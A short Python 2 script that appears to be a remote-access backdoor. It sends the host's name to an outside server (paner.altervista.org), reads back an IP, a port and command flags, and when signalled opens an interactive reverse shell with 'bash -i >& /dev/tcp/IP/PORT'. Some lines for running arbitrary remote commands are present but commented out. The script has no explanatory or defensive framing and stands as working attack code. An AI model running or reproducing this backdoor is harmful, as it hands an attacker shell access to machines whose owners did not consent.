#!/usr/bin/python
import time
import sys
import os
import httplib
import subprocess
from os import path, access, R_OK
from subprocess import Popen

import socket
if socket.gethostname().find('.')>=0:
    name=socket.gethostname()
else:
    name=socket.gethostbyaddr(socket.gethostname())[0]



try:
    print name
    httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
    httpServ.connect()
    httpServ.request('GET', "/svc/wup.php?pc="+name)
    response = httpServ.getresponse()
    
    if response.status == httplib.OK:
        print "Output from HTML request"
        sresponse = response.read()
        ifind=sresponse.find('ip=')
        sip = sresponse[ifind+3:sresponse.find('||',ifind)]
        ifind=sresponse.find('port=')
        sport = sresponse[ifind+5:sresponse.find('||',ifind)]
        ifind=sresponse.find('kill=')
        skill = sresponse[ifind+5:sresponse.find('||',ifind)]
        ifind=sresponse.find('exec=')
        sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
        ifind=sresponse.find('cmd=')
        scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
        print skill
        httpServ.close()
    if sexec == '1':
    	#os.system(scmd)
    	print scmd
    	#p = Popen(scmd,shell='false')
    	
    	#httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
        #os.system("wait")
    if skill == '0':
    	#p = Popen("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
        os.system("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
        #httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
        os.system("wait")
    
except Exception,e:
    print str(e)  
    
